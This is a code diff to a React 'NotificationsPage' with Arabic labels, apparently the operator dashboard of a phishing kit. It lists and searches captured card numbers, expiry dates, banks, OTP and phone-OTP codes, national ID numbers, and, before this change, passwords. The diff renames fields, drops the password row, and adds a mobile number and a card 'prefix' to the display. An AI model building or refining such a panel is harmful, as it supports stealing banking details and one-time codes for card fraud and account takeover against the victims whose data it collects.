@@ -142,8 +142,7 @@ interface Notification {
   network: string;
   phoneOtp: string;
   cardExpiry: string;
-  userName?: string;
-  password?: string;
+  name: string;
   otpCode: string;
   phone: string;
   flagColor?: string;
@@ -877,7 +876,7 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (notification) =>
-          notification.userName?.toLowerCase().includes(term) ||
+          notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
@@ -1621,10 +1620,10 @@ export default function NotificationsPage() {
                         <div className="flex flex-wrap gap-2">
                           <Badge
                             variant={
-                              notification.userName ? "default" : "secondary"
+                              notification.phone ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.userName
+                              notification.phone
                                 ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                 : ""
                             }`}
@@ -1633,7 +1632,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.userName
+                            {notification.phone
                               ? "معلومات شخصية"
                               : "لا يوجد معلومات"}
                           </Badge>
@@ -1805,9 +1804,9 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.userName ? "default" : "secondary"}
+                          variant={notification.phone ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.userName
+                            notification.phone
                               ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                               : ""
                           }`}
@@ -1816,7 +1815,7 @@ export default function NotificationsPage() {
                           }
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.userName
+                          {notification.phone
                             ? "معلومات شخصية"
                             : "لا يوجد معلومات"}
                         </Badge>
@@ -1966,13 +1965,13 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.userName },
+                  { label: "الاسم", value: selectedNotification.name },
                   { label: "رقم الهوية", value: selectedNotification.idNumber },
                   {
                     label: "البريد الإلكتروني",
                     value: selectedNotification.email,
                   },
-                  { label: "كلمة المرور", value: selectedNotification.password },
+                  { label: "رقم الجوال", value: selectedNotification.mobile },
                   { label: "الهاتف", value: selectedNotification.phone },
                 ].map(
                   ({ label, value }) =>
@@ -1999,7 +1998,7 @@ export default function NotificationsPage() {
                { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber ,
+                    value: selectedNotification?.cardNumber +" - "+selectedNotification?.prefix ,
                   },
                   {
                     label: "تاريخ الانتهاء",
@@ -2021,7 +2020,7 @@ export default function NotificationsPage() {
                         <span className="font-medium text-muted-foreground">
                           {label}:
                         </span>
-                        <span className="font-semibold" dir='ltr'>{value}</span>
+                        <span className="font-semibold">{value}</span>
                       </div>
                     )
                 )}
@@ -2053,5 +2052,3 @@ export default function NotificationsPage() {
     </div>
   );
 }
-
-
